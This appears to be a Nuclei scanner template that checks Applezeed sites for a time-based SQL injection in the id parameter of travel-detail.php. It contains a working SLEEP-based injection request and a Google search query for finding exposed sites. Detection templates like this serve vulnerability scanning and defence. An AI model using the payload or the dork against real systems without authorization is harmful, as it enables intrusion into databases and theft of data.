id: applezeed-sqli

info:
  name: Applezeed - SQL 注入漏洞
  author: r3Y3r53
  severity: high
  description: Applezeed - SQL 注入 存在SQL 注入漏洞。攻击者可借助可控参数干预后端 SQL 查询，从而读取敏感数据、绕过鉴权或进一步影响数据库完整性。
  reference:
    - https://cxsecurity.com/issue/WLB-2019120057
  classification:
    cwe-id: CWE-89
  metadata:
    verified: true
    max-request: 1
    google-query: intext:"Power BY applezeed.com"
  tags: time-based-sqli,sqli,unauth,applezeed,vuln

http:
  - raw:
      - |
        @timeout: 15s
        GET /travel-detail.php?id=1%27AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(6)))bAKL)%20AND%20%27vRxe%27=%27vRxe HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'duration>=6'
          - 'contains(content_type, "text/html")'
          - 'contains(body, "applezeed")'
          - 'status_code == 200'
        condition: and
